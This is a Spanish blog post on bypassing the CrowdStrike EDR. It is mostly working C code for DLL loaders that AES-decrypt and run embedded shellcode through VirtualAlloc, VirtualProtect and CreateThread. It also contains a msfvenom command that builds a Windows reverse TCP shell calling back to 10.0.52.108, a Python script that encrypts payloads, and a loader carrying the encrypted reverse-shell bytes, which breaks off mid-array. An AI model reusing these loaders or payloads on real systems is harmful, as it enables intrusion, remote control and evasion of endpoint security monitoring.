---
layout: default
---

# Crowdstrike Bypass 1.0

Comenzamos el post con buenas y malas noticias. Las buenas `Tenemos un bypass para inyectar código en crowdstrike`, las malas son que aún no es un bypass completo. 
Por lo tanto, ¿que se ha conseguido? tenemos un código que partiendo de un binario tipo DLL, es capaz de inyectar un shellcode sin detección que es capaz de realizar comandos sobre el sistema operativo `WoooU`.


# Limitaciones

Las limitaciones al realizar las pruebas con un sistema operativo que tenga este EDR comercial son dos:
- Limitación en la escritura en disco: En tiempo de escritura sobre el sistema operativo el EDR realiza un análisis del binario y lo califica con un nivel de peligrosidad, que puede ser puesto en cuarentena he incluso borrado.
Esto ha ocurrido con el 90% de las muestras que he probado, pero se ha detectado una debilidad con cierto tipo de inyección desde una DLL, que será el camino que explotaremos y analizaremos a continuación.
- Limitación en tiempo de ejecución: No quiere decir que por que el EDR permita la escritura en disco no lo esté analizando en tiempo de ejecución. Esto reduce el porcentaje de los binarios probados un 7% más aproximadamente.

Por lo tanto si, has seguido el blog hasta este punto, puedes empezar a pertenece a ese 3% restante que puede inyectar código en el EDR!!.

Ahora bien, la inyección no es completa y el motivo lo presento en el siguiente diagrama:

![crowdstrike_bypass_1_0](/assets/images/EDR_injecrion_crowdstrike.png)

Esto quiere decir que el nuevo proceso malicioso tras la inyección del payload/shellcode está auditado y su ejecución puede ser bloqueada en el caso de que los umbrales de actividad maliciosa `AssociateIndicator` (para los que entiendan de crowdstrike) sobrepasen el umbral permitido. 

# Pruebas de concepto

Se realizarán 3 pruebas de concepto en el siguiente orden:
- Dll con inyección de código que muestra una calculadora
- Dll con shell reversa a un entorno colindante en un Sistema operativo Kali `persistencia`
- Dll para escalada de privilegios, creando un nuevo usuario administrador f0ns1 `escalada de privilegios`


## Inyección de código base

Sorprendentemente, la siguiente inyección de código funciona en crowdstrike desde una DLL. permitiendo tanto la escritura en disco como la ejecución del código mediante runddl32.exe:

Test 1:
```c

#include <winternl.h>
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#include <psapi.h>


extern "C"{ 
unsigned char payload[] = { 0x7, 0x26, 0xd8, 0x8e, 0xb8, 0x78, 0xf9, 0x78, 0x84, 0x3c, 0x0, 0xa8, 0x5b, 0xa, 0x6a, 0xe2, 0xc9, 0x6d, 0x63, 0x8b, 0x87, 0x9e, 0x80, 0xb5, 0x16, 0xc5, 0xa5, 0xc7, 0xda, 0x44, 0x1d, 0x2d, 0xae, 0x48, 0x2c, 0xb1, 0xc8, 0x92, 0xf5, 0xbc, 0xf5, 0xb8, 0xe6, 0xda, 0x9, 0x3c, 0x85, 0x9e, 0xac, 0xfa, 0x4c, 0xce, 0xa4, 0x35, 0x0, 0xdc, 0x50, 0x6b, 0x36, 0xb7, 0x5c, 0xfb, 0x12, 0xf1, 0x52, 0x46, 0x5b, 0x15, 0x3, 0x7d, 0x7b, 0x4e, 0x8d, 0x71, 0xf5, 0x7c, 0x43, 0x87, 0x46, 0x54, 0x64, 0xf9, 0x75, 0xab, 0x65, 0xb0, 0xbf, 0x9b, 0xc3, 0xd2, 0x3a, 0x73, 0xfc, 0xe3, 0x35, 0xe1, 0x23, 0x5d, 0x29, 0xe5, 0x10, 0xe2, 0x72, 0xef, 0xa9, 0x25, 0xa, 0x5a, 0x1f, 0x8e, 0xf7, 0xa5, 0xd8, 0x8b, 0x16, 0x33, 0xcf, 0x91, 0xde, 0x17, 0x79, 0x6, 0x5f, 0xd9, 0x61, 0x2c, 0x6a, 0x90, 0x7a, 0xaf, 0xb3, 0xdd, 0x1e, 0x0, 0xe3, 0xf3, 0x70, 0x5, 0x7a, 0x6d, 0x42, 0x7f, 0xb2, 0xc, 0xe0, 0xa2, 0xce, 0x3b, 0x1f, 0xa3, 0xf5, 0xcf, 0xa9, 0x1f, 0x3a, 0xf7, 0xab, 0x3, 0xf3, 0x36, 0xf2, 0x86, 0xf4, 0x4f, 0x20, 0x4a, 0xaa, 0x6a, 0x1c, 0xae, 0xe0, 0x13, 0x29, 0xe3, 0xb7, 0x84, 0xd8, 0x9b, 0xbc, 0x2f, 0xa6, 0xb2, 0x5f, 0xdc, 0x3b, 0x1, 0x70, 0x16, 0x61, 0x4c, 0xee, 0x42, 0x69, 0xf6, 0x1, 0x87, 0x76, 0x2f, 0x84, 0x14, 0x38, 0xd3, 0xa6, 0xe0, 0x25, 0x57, 0xa0, 0x7e, 0x4c, 0x1c, 0x6, 0xf, 0xae, 0x29, 0x92, 0x10, 0x3f, 0x5a, 0xff, 0x1d, 0x57, 0x67, 0x18, 0xba, 0x67, 0xb1, 0x7d, 0x9a, 0x6f, 0x48, 0xa3, 0x23, 0x23, 0x12, 0x62, 0xe3, 0x8b, 0xfb, 0x3e, 0x63, 0x9, 0xd0, 0x1d, 0xf8, 0xb0, 0xf6, 0x9c, 0x94, 0xd4, 0xb3, 0x2b, 0xfe, 0xe, 0xbb, 0x98, 0x65, 0xcf, 0x29, 0x39, 0xf8, 0x74, 0x3b, 0x9d, 0x24, 0xc2, 0xc, 0xa4, 0xdf, 0x7e, 0x4, 0xfd, 0xf9, 0x11, 0xc5, 0x36, 0xc6, 0xb5, 0x27, 0xd, 0x16, 0xa9, 0xe, 0xe3, 0x9, 0x65, 0xfb, 0xa5, 0xa3 };
unsigned char key[] = { 0xaf, 0x86, 0x80, 0xd4, 0x5e, 0xa3, 0xae, 0x79, 0xa9, 0x92, 0x38, 0xbe, 0x79, 0x8a, 0x9c, 0x41 };

int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keylen) {
        HCRYPTPROV hProv;
        HCRYPTHASH hHash;
        HCRYPTKEY hKey;
        if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
                        return -1;
        }
        if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
                        return -1;
        }
        if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)){
                        return -1;              
        }
        if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
                        return -1;
        }
        
        if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, (BYTE *) payload, (DWORD *) &payload_len)){
                        return -1;
        }
        
        CryptReleaseContext(hProv, 0);
        CryptDestroyHash(hHash);
        CryptDestroyKey(hKey);
        
        return 0;
}
__declspec(dllexport) void f0ns1(void) {
    void * exec_mem;
    BOOL rv;
    HANDLE th;
    DWORD oldprotect = 0;
	unsigned int payload_len = sizeof(payload);
	exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	AESDecrypt((char *) payload, payload_len, (char *) key, sizeof(key));
	RtlMoveMemory(exec_mem, payload, payload_len);
	rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);
	if ( rv != 0 ) {
					th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
					WaitForSingleObject(th, -1);
	}

}
}

BOOL APIENTRY DllMain(HMODULE hModule,  DWORD  ul_reason_for_call, LPVOID lpReserved) {

    switch (ul_reason_for_call)  {
    case DLL_PROCESS_ATTACH:
		break;
    case DLL_THREAD_ATTACH:
		break;
    case DLL_THREAD_DETACH:
		break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

```

Test 2:
```c
#include <winternl.h>
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#include <psapi.h>




// calc shellcode (exitThread) - 64-bit
unsigned char payload[] = { 0x7, 0x26, 0xd8, 0x8e, 0xb8, 0x78, 0xf9, 0x78, 0x84, 0x3c, 0x0, 0xa8, 0x5b, 0xa, 0x6a, 0xe2, 0xc9, 0x6d, 0x63, 0x8b, 0x87, 0x9e, 0x80, 0xb5, 0x16, 0xc5, 0xa5, 0xc7, 0xda, 0x44, 0x1d, 0x2d, 0xae, 0x48, 0x2c, 0xb1, 0xc8, 0x92, 0xf5, 0xbc, 0xf5, 0xb8, 0xe6, 0xda, 0x9, 0x3c, 0x85, 0x9e, 0xac, 0xfa, 0x4c, 0xce, 0xa4, 0x35, 0x0, 0xdc, 0x50, 0x6b, 0x36, 0xb7, 0x5c, 0xfb, 0x12, 0xf1, 0x52, 0x46, 0x5b, 0x15, 0x3, 0x7d, 0x7b, 0x4e, 0x8d, 0x71, 0xf5, 0x7c, 0x43, 0x87, 0x46, 0x54, 0x64, 0xf9, 0x75, 0xab, 0x65, 0xb0, 0xbf, 0x9b, 0xc3, 0xd2, 0x3a, 0x73, 0xfc, 0xe3, 0x35, 0xe1, 0x23, 0x5d, 0x29, 0xe5, 0x10, 0xe2, 0x72, 0xef, 0xa9, 0x25, 0xa, 0x5a, 0x1f, 0x8e, 0xf7, 0xa5, 0xd8, 0x8b, 0x16, 0x33, 0xcf, 0x91, 0xde, 0x17, 0x79, 0x6, 0x5f, 0xd9, 0x61, 0x2c, 0x6a, 0x90, 0x7a, 0xaf, 0xb3, 0xdd, 0x1e, 0x0, 0xe3, 0xf3, 0x70, 0x5, 0x7a, 0x6d, 0x42, 0x7f, 0xb2, 0xc, 0xe0, 0xa2, 0xce, 0x3b, 0x1f, 0xa3, 0xf5, 0xcf, 0xa9, 0x1f, 0x3a, 0xf7, 0xab, 0x3, 0xf3, 0x36, 0xf2, 0x86, 0xf4, 0x4f, 0x20, 0x4a, 0xaa, 0x6a, 0x1c, 0xae, 0xe0, 0x13, 0x29, 0xe3, 0xb7, 0x84, 0xd8, 0x9b, 0xbc, 0x2f, 0xa6, 0xb2, 0x5f, 0xdc, 0x3b, 0x1, 0x70, 0x16, 0x61, 0x4c, 0xee, 0x42, 0x69, 0xf6, 0x1, 0x87, 0x76, 0x2f, 0x84, 0x14, 0x38, 0xd3, 0xa6, 0xe0, 0x25, 0x57, 0xa0, 0x7e, 0x4c, 0x1c, 0x6, 0xf, 0xae, 0x29, 0x92, 0x10, 0x3f, 0x5a, 0xff, 0x1d, 0x57, 0x67, 0x18, 0xba, 0x67, 0xb1, 0x7d, 0x9a, 0x6f, 0x48, 0xa3, 0x23, 0x23, 0x12, 0x62, 0xe3, 0x8b, 0xfb, 0x3e, 0x63, 0x9, 0xd0, 0x1d, 0xf8, 0xb0, 0xf6, 0x9c, 0x94, 0xd4, 0xb3, 0x2b, 0xfe, 0xe, 0xbb, 0x98, 0x65, 0xcf, 0x29, 0x39, 0xf8, 0x74, 0x3b, 0x9d, 0x24, 0xc2, 0xc, 0xa4, 0xdf, 0x7e, 0x4, 0xfd, 0xf9, 0x11, 0xc5, 0x36, 0xc6, 0xb5, 0x27, 0xd, 0x16, 0xa9, 0xe, 0xe3, 0x9, 0x65, 0xfb, 0xa5, 0xa3 };
unsigned char key[] = { 0xaf, 0x86, 0x80, 0xd4, 0x5e, 0xa3, 0xae, 0x79, 0xa9, 0x92, 0x38, 0xbe, 0x79, 0x8a, 0x9c, 0x41 };

extern "C"{ 
int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keylen) {
        HCRYPTPROV hProv;
        HCRYPTHASH hHash;
        HCRYPTKEY hKey;

        if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
                        return -1;
        }
        if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
                        return -1;
        }
        if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)){
                        return -1;              
        }
        if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
                        return -1;
        }
        
        if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, (BYTE *) payload, (DWORD *) &payload_len)){
                        return -1;
        }
        
        CryptReleaseContext(hProv, 0);
        CryptDestroyHash(hHash);
        CryptDestroyKey(hKey);
        
        return 0;
}
__declspec(dllexport) void f0ns1(void) {
    void * exec_mem;
    BOOL rv;
    HANDLE th;
    DWORD oldprotect = 0;
	unsigned int payload_len = sizeof(payload);
	exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	AESDecrypt((char *) payload, payload_len, (char *) key, sizeof(key));
	RtlMoveMemory(exec_mem, payload, payload_len);
	rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);
	if ( rv != 0 ) {
					th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
					WaitForSingleObject(th, -1);
	}

}
}

BOOL APIENTRY DllMain(HMODULE hModule,  DWORD  ul_reason_for_call, LPVOID lpReserved) {

    switch (ul_reason_for_call)  {
    case DLL_PROCESS_ATTACH:
		break;
    case DLL_THREAD_ATTACH:
		break;
    case DLL_THREAD_DETACH:
		break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```
Test 3:
```c
#include <winternl.h>
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#include <psapi.h>


int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keylen) {
        HCRYPTPROV hProv;
        HCRYPTHASH hHash;
        HCRYPTKEY hKey;

        if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
                        return -1;
        }
        if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
                        return -1;
        }
        if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)){
                        return -1;              
        }
        if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
                        return -1;
        }
        
        if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, (BYTE *) payload, (DWORD *) &payload_len)){
                        return -1;
        }
        
        CryptReleaseContext(hProv, 0);
        CryptDestroyHash(hHash);
        CryptDestroyKey(hKey);
        
        return 0;
}

// calc shellcode (exitThread) - 64-bit
unsigned char payload[] = { 0x7, 0x26, 0xd8, 0x8e, 0xb8, 0x78, 0xf9, 0x78, 0x84, 0x3c, 0x0, 0xa8, 0x5b, 0xa, 0x6a, 0xe2, 0xc9, 0x6d, 0x63, 0x8b, 0x87, 0x9e, 0x80, 0xb5, 0x16, 0xc5, 0xa5, 0xc7, 0xda, 0x44, 0x1d, 0x2d, 0xae, 0x48, 0x2c, 0xb1, 0xc8, 0x92, 0xf5, 0xbc, 0xf5, 0xb8, 0xe6, 0xda, 0x9, 0x3c, 0x85, 0x9e, 0xac, 0xfa, 0x4c, 0xce, 0xa4, 0x35, 0x0, 0xdc, 0x50, 0x6b, 0x36, 0xb7, 0x5c, 0xfb, 0x12, 0xf1, 0x52, 0x46, 0x5b, 0x15, 0x3, 0x7d, 0x7b, 0x4e, 0x8d, 0x71, 0xf5, 0x7c, 0x43, 0x87, 0x46, 0x54, 0x64, 0xf9, 0x75, 0xab, 0x65, 0xb0, 0xbf, 0x9b, 0xc3, 0xd2, 0x3a, 0x73, 0xfc, 0xe3, 0x35, 0xe1, 0x23, 0x5d, 0x29, 0xe5, 0x10, 0xe2, 0x72, 0xef, 0xa9, 0x25, 0xa, 0x5a, 0x1f, 0x8e, 0xf7, 0xa5, 0xd8, 0x8b, 0x16, 0x33, 0xcf, 0x91, 0xde, 0x17, 0x79, 0x6, 0x5f, 0xd9, 0x61, 0x2c, 0x6a, 0x90, 0x7a, 0xaf, 0xb3, 0xdd, 0x1e, 0x0, 0xe3, 0xf3, 0x70, 0x5, 0x7a, 0x6d, 0x42, 0x7f, 0xb2, 0xc, 0xe0, 0xa2, 0xce, 0x3b, 0x1f, 0xa3, 0xf5, 0xcf, 0xa9, 0x1f, 0x3a, 0xf7, 0xab, 0x3, 0xf3, 0x36, 0xf2, 0x86, 0xf4, 0x4f, 0x20, 0x4a, 0xaa, 0x6a, 0x1c, 0xae, 0xe0, 0x13, 0x29, 0xe3, 0xb7, 0x84, 0xd8, 0x9b, 0xbc, 0x2f, 0xa6, 0xb2, 0x5f, 0xdc, 0x3b, 0x1, 0x70, 0x16, 0x61, 0x4c, 0xee, 0x42, 0x69, 0xf6, 0x1, 0x87, 0x76, 0x2f, 0x84, 0x14, 0x38, 0xd3, 0xa6, 0xe0, 0x25, 0x57, 0xa0, 0x7e, 0x4c, 0x1c, 0x6, 0xf, 0xae, 0x29, 0x92, 0x10, 0x3f, 0x5a, 0xff, 0x1d, 0x57, 0x67, 0x18, 0xba, 0x67, 0xb1, 0x7d, 0x9a, 0x6f, 0x48, 0xa3, 0x23, 0x23, 0x12, 0x62, 0xe3, 0x8b, 0xfb, 0x3e, 0x63, 0x9, 0xd0, 0x1d, 0xf8, 0xb0, 0xf6, 0x9c, 0x94, 0xd4, 0xb3, 0x2b, 0xfe, 0xe, 0xbb, 0x98, 0x65, 0xcf, 0x29, 0x39, 0xf8, 0x74, 0x3b, 0x9d, 0x24, 0xc2, 0xc, 0xa4, 0xdf, 0x7e, 0x4, 0xfd, 0xf9, 0x11, 0xc5, 0x36, 0xc6, 0xb5, 0x27, 0xd, 0x16, 0xa9, 0xe, 0xe3, 0x9, 0x65, 0xfb, 0xa5, 0xa3 };
unsigned char key[] = { 0xaf, 0x86, 0x80, 0xd4, 0x5e, 0xa3, 0xae, 0x79, 0xa9, 0x92, 0x38, 0xbe, 0x79, 0x8a, 0x9c, 0x41 };

extern "C" __declspec(dllexport) void f0ns1(void) {
    void * exec_mem;
    BOOL rv;
    HANDLE th;
    DWORD oldprotect = 0;
	unsigned int payload_len = sizeof(payload);
	exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	AESDecrypt((char *) payload, payload_len, (char *) key, sizeof(key));
	RtlMoveMemory(exec_mem, payload, payload_len);
	rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);
	if ( rv != 0 ) {
					th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
					WaitForSingleObject(th, -1);
	}

}
}

BOOL APIENTRY DllMain(HMODULE hModule,  DWORD  ul_reason_for_call, LPVOID lpReserved) {

    switch (ul_reason_for_call)  {
    case DLL_PROCESS_ATTACH:
		break;
    case DLL_THREAD_ATTACH:
		break;
    case DLL_THREAD_DETACH:
		break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

```

![EDR create Admin user](/assets/images/EDR_1_calc_injection.png)

Simple pero efectivo en los 3 casos inyectas código y spwaneas una calculadora.

## Inyección de un shell reversa

Dado que tenemos la inyección de código probaremos a crear un payload malicioso que nos ejecute una shell reversa, mediante msfvenom de metaexploit framework:

```
msfvenom --platform Windows -p windows/shell/reverse_tcp LHOST=10.0.52.108 LPORT=8989  > raw_reverse_shell_tcp.bin 
```
Encriptamos el payload con criptografía simétrica mediante AES, script en python:

```python
import sys
from base64 import b64encode
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes
import hashlib

KEY = get_random_bytes(16)
iv = 16 * b'\x00'
cipher = AES.new(hashlib.sha256(KEY).digest(), AES.MODE_CBC, iv)

try:
    plaintext = open(sys.argv[1], "rb").read()
except:
    print("File argument needed! %s <raw payload file>" % sys.argv[0])
    sys.exit()

ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))

print('AESkey[] = { 0x' + ', 0x'.join(hex(x)[2:] for x in KEY) + ' };')
print('payload[] = { 0x' + ', 0x'.join(hex(x)[2:] for x in ciphertext) + ' };')
```
Salida del proceso:
```python
python ..\aes.py raw_reverse_shell_tcp.bin
AESkey[] = { 0x2f, 0xd, 0x11, 0x61, 0x8e, 0xb2, 0x21, 0xe4, 0x86, 0x42, 0xcc, 0x11, 0x82, 0x9f, 0xcc, 0xa4 };
payload[] = { 0xd3, 0xac, 0x1e, 0x2d, 0x67, 0xb2, 0xf2, 0x6c, 0xfb, 0x1c, 0x26, 0x1d, 0x81, 0x96, 0x3a, 0x5c, 0xa, 0xd4, 0xb6, 0xcb, 0x17, 0x24, 0x30, 0xa4, 0xbc, 0x81, 0x1e, 0x60, 0x88, 0x5e, 0xe7, 0x7e, 0x9e, 0xf1, 0x89, 0xaa, 0x99, 0xcf, 0xdc, 0xfc, 0xc7, 0x21, 0xaa, 0x89, 0x73, 0x4b, 0x57, 0x5d, 0xf3, 0x59, 0x11, 0x95, 0x2b, 0x78, 0xea, 0x9c, 0xdb, 0xa5, 0x28, 0x78, 0x17, 0xaa, 0xf0, 0x94, 0xfc, 0xe0, 0xfe, 0x55, 0x15, 0x1e, 0x7e, 0xe4, 0x50, 0xbd, 0x8a, 0x5b, 0x98, 0xb9, 0xcc, 0xd7, 0x19, 0x78, 0x90, 0x2e, 0x41, 0x60, 0x77, 0x24, 0xdb, 0x7, 0x96, 0x3e, 0x81, 0x3f, 0x81, 0xe3, 0x27, 0x1f, 0x0, 0x18, 0xf0, 0x86, 0x78, 0xda, 0x85, 0x63, 0x62, 0x32, 0x37, 0x67, 0xa8, 0x6f, 0xd8, 0x1d, 0xe4, 0x9, 0xb7, 0xeb, 0xce, 0xa4, 0xf6, 0xb8, 0x36, 0x1e, 0x81, 0xe1, 0x70, 0x4, 0x94, 0xbc, 0xc5, 0xb4, 0x9d, 0xdb, 0x1e, 0x56, 0x97, 0x46, 0x5c, 0x30, 0xa9, 0xaa, 0x68, 0x72, 0x23, 0xb3, 0x14, 0xb8, 0xec, 0xce, 0x8d, 0x22, 0xd5, 0xc6, 0xe, 0xdd, 0xf2, 0x73, 0xa4, 0xf2, 0xe2, 0xea, 0xb0, 0x80, 0xf, 0xee, 0xd1, 0x47, 0x54, 0x84, 0x1e, 0x9f, 0x5f, 0x7, 0xd3, 0x5c, 0x41, 0xe9, 0x5, 0x79, 0x5b, 0x30, 0x5c, 0x98, 0x5, 0xb2, 0x2a, 0x98, 0x5d, 0x8c, 0xfa, 0xaf, 0x3c, 0x1e, 0x64, 0x41, 0x9b, 0x62, 0xe, 0xad, 0xde, 0x50, 0x79, 0x60, 0xfb, 0x49, 0x63, 0x46, 0x8f, 0x78, 0xa, 0x6e, 0x5a, 0xfb, 0x6b, 0xa8, 0x21, 0xb6, 0xd6, 0xe5, 0x30, 0x9c, 0x5f, 0xc2, 0xf7, 0xda, 0xbe, 0x9b, 0x48, 0x7b, 0x7f, 0xe3, 0x7f, 0x9b, 0x22, 0x64, 0x72, 0x7e, 0x4e, 0x7a, 0xfe, 0x24, 0x76, 0xe1, 0x94, 0xf5, 0x4b, 0x26, 0xe9, 0xd, 0xa, 0x68, 0x68, 0xcd, 0x35, 0xe6, 0xd9, 0xc9, 0x19, 0xeb, 0xd5, 0x12, 0xbf, 0x49, 0x84, 0x78, 0xe3, 0xe9, 0x29, 0xd1, 0xee, 0xfc, 0x87, 0x35, 0xfc, 0xa3, 0xe4, 0xde, 0x5a, 0x52, 0x89, 0x41, 0xaf, 0x40, 0xd6, 0x72, 0x17, 0x28, 0x5d, 0xb6, 0xc8, 0xed, 0xfd, 0x33, 0xab, 0x6b, 0x50, 0x6c, 0x4c, 0x6b, 0xb, 0x48, 0x60, 0x8e, 0x23, 0x40, 0xbc, 0x4b, 0x64, 0xea, 0x1e, 0x49, 0xec, 0x6, 0x7d, 0x7, 0x18, 0xe6, 0x25, 0x93, 0xf0, 0x4c, 0x41, 0xcd, 0x6a, 0xce, 0x42, 0xd9, 0x15, 0x3d, 0xa8, 0x46, 0x2b, 0xab, 0x93, 0xa8, 0xd5, 0x59, 0xea, 0x0, 0xb1, 0xe9, 0x36, 0xa9, 0x93, 0xa4, 0xc9, 0xfa, 0x29, 0xfc, 0xf9, 0x4d, 0x7b, 0x5, 0x94, 0x8f, 0x55, 0xe0, 0x21, 0xaf, 0x12, 0x6b, 0xd2, 0x18, 0xf0, 0x9f, 0x5e, 0xf9, 0x53, 0x59, 0x81, 0x15, 0xd7, 0xea, 0xe5, 0x18, 0xe9, 0x45, 0xee, 0x1b, 0x99, 0xee, 0xfd, 0x12, 0x7a, 0x5e, 0x27, 0x21, 0x13, 0xa2, 0xc8, 0x86, 0xfe, 0xc3, 0xcd, 0xeb, 0xee, 0x9d, 0x1d, 0x5a, 0x62, 0xd6, 0xbd, 0x74, 0xb1, 0x64, 0x12, 0xa, 0x37, 0xd1, 0x2e, 0xa5, 0xaf, 0xc8, 0xaf, 0x70, 0xa6, 0x97, 0xea, 0x9b, 0xed, 0x19, 0xd6, 0x73, 0x51, 0x2a, 0x48, 0xac, 0xaa, 0x4d, 0xee, 0xaf, 0xce, 0xf0, 0xfe, 0x4b, 0xee, 0x35, 0x8f, 0x3d, 0xf0, 0x9d, 0xaf, 0x7d, 0x14, 0x82, 0x2a, 0xee, 0xce, 0x5c, 0x1b, 0x4f, 0x39, 0xfb, 0x9f, 0xf4, 0xd4, 0x27, 0x53, 0xa6, 0x40, 0x4e, 0x59, 0xa2 };
```

El código fuente por lo tanto nos quedará del siguiente modo:

```c
#include <winternl.h>
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#include <psapi.h>


int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keylen) {
        HCRYPTPROV hProv;
        HCRYPTHASH hHash;
        HCRYPTKEY hKey;
        if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
                        return -1;
        }
        if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
                        return -1;
        }
        if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)){
                        return -1;              
        }
        if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
                        return -1;
        }
        
        if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, (BYTE *) payload, (DWORD *) &payload_len)){
                        return -1;
        }      
        CryptReleaseContext(hProv, 0);
        CryptDestroyHash(hHash);
        CryptDestroyKey(hKey);
        return 0;
}

unsigned char key[] = { 0x2f, 0xd, 0x11, 0x61, 0x8e, 0xb2, 0x21, 0xe4, 0x86, 0x42, 0xcc, 0x11, 0x82, 0x9f, 0xcc, 0xa4 };
unsigned char payload[] = { 0xd3, 0xac, 0x1e, 0x2d, 0x67, 0xb2, 0xf2, 0x6c, 0xfb, 0x1c, 0x26, 0x1d, 0x81, 0x96, 0x3a, 0x5c, 0xa, 0xd4, 0xb6, 0xcb, 0x17, 0x24, 0x30, 0xa4, 0xbc, 0x81, 0x1e, 0x60, 0x88, 0x5e, 0xe7, 0x7e, 0x9e, 0xf1, 0x89, 0xaa, 0x99, 0xcf, 0xdc, 0xfc, 0xc7, 0x21, 0xaa, 0x89, 0x73, 0x4b, 0x57, 0x5d, 0xf3, 0x59, 0x11, 0x95, 0x2b, 0x78, 0xea, 0x9c, 0xdb, 0xa5, 0x28, 0x78, 0x17, 0xaa, 0xf0, 0x94, 0xfc, 0xe0, 0xfe, 0x55, 0x15, 0x1e, 0x7e, 0xe4, 0x50, 0xbd, 0x8a, 0x5b, 0x98, 0xb9, 0xcc, 0xd7, 0x19, 0x78, 0x90, 0x2e, 0x41, 0x60, 0x77, 0x24, 0xdb, 0x7, 0x96, 0x3e, 0x81, 0x3f, 0x81, 0xe3, 0x27, 0x1f, 0x0, 0x18, 0xf0, 0x86, 0x78, 0xda, 0x85, 0x63, 0x62, 0x32, 0x37, 0x67, 0xa8, 0x6f, 0xd8, 0x1d, 0xe4, 0x9, 0xb7, 0xeb, 0xce, 0xa4, 0xf6, 0xb8, 0x36, 0x1e, 0x81, 0xe1, 0x70, 0x4, 0x94, 0xbc, 0xc5, 0xb4, 0x9d, 0xdb, 0x1e, 0x56, 0x97, 0x46, 0x5c, 0x30, 0xa9, 0xaa, 0x68, 0x72, 0x23, 0xb3, 0x14, 0xb8, 0xec, 0xce, 0x8d, 0x22, 0xd5, 0xc6, 0xe, 0xdd, 0xf2, 0x73, 0xa4, 0xf2, 0xe2, 0xea, 0xb0, 0x80, 0xf, 0xee, 0xd1, 0x47, 0x54, 0x84, 0x1e, 0x9f, 0x5f, 0x7, 0xd3, 0x5c, 0x41, 0xe9, 0x5, 0x79, 0x5b, 0x30, 0x5c, 0x98, 0x5, 0xb2, 0x2a, 0x98, 0x5d, 0x8c, 0xfa, 0xaf, 0x3c, 0x1e, 0x64, 0x41, 0x9b, 0x62, 0xe, 0xad, 0xde, 0x50, 0x79, 0x60, 0xfb, 0x49, 0x63, 0x46, 0x8f, 0x78, 0xa, 0x6e, 0x5a, 0xfb, 0x6b, 0xa8, 0x21, 0xb6, 0xd6, 0xe5, 0x30, 0x9c, 0x5f, 0xc2, 0xf7, 0xda, 0xbe, 0x9b, 0x48, 0x7b, 0x7f, 0xe3, 0x7f, 0x9b, 0x22, 0x64, 0x72, 0x7e, 0x4e, 0x7a, 0xfe, 0x24, 0x76, 0xe1, 0x94, 0xf5, 0x4b, 0x26, 0xe9, 0xd, 0xa, 0x68, 0x68, 0xcd, 0x35, 0xe6, 0xd9, 0xc9, 0x19, 0xeb, 0xd5, 0x12, 0xbf, 0x49, 0x84, 0x78, 0xe3, 0xe9, 0x29, 0xd1, 0xee, 0xfc, 0x87, 0x35, 0xfc, 0xa3, 0xe4, 0xde, 0x5a, 0x52, 0x89, 0x41, 0xaf, 0x40, 0xd6, 0x72, 0x17, 0x28, 0x5d, 0xb6, 0xc8, 0xed, 0xfd, 0x33, 0xab, 